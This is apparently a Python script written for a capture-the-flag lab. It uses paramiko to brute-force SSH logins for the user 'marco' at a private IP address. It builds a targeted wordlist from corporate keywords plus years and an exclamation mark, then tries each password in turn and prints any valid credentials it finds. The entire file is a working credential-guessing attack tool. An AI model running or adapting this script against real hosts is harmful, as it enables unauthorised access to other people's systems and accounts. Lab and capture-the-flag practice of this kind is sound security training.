import sys
import paramiko

# Target configurations
TARGET_IP = "10.48.182.153"
PORT = 22
USERNAME = "marco"

# Target-specific pattern variables
KEYWORDS = ["Security", "Excellence", "Innovation", "Digital", "Cloud"]
YEARS = range(2020, 2027)  # Generates 2020 to 2026

def generate_passwords():
    """Generates password candidates based on the CTF clues."""
    passwords = []
    for keyword in KEYWORDS:
        for year in YEARS:
            # Pattern: CapitalizedKeyword + Year + !
            passwords.append(f"{keyword}{year}!")
    return passwords

def attempt_ssh(password):
    """Attempts an SSH connection with a single password."""
    ssh = paramiko.SSHClient()
    # Automatically add the server's SSH key (necessary for custom lab environments)
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(TARGET_IP, port=PORT, username=USERNAME, password=password, timeout=2)
        # If connection succeeds, close it and return True
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        # Password failed
        return False
    except paramiko.SSHException as e:
        print(f"[-] SSH Error on {password}: {e}")
        return False
    except Exception as e:
        print(f"[-] Connection error: {e}")
        sys.exit(1)

def main():
    print(f"[*] Generating targeted wordlist for user '{USERNAME}'...")
    wordlist = generate_passwords()
    print(f"[*] Generated {len(wordlist)} total combinations.")
    print(f"[*] Starting custom brute-force against ssh://{TARGET_IP}:{PORT}...\n")
    
    for pwd in wordlist:
        print(f"[*] Trying: {pwd}", end="\r") # Overwrites the line to look clean
        if attempt_ssh(pwd):
            print(f"\n[+] SUCCESS! Valid credentials found:")
            print(f"    Username: {USERNAME}")
            print(f"    Password: {pwd}\n")
            break
    else:
        print("\n[-] Wordlist exhausted. No valid password found.")

if __name__ == "__main__":
    main()
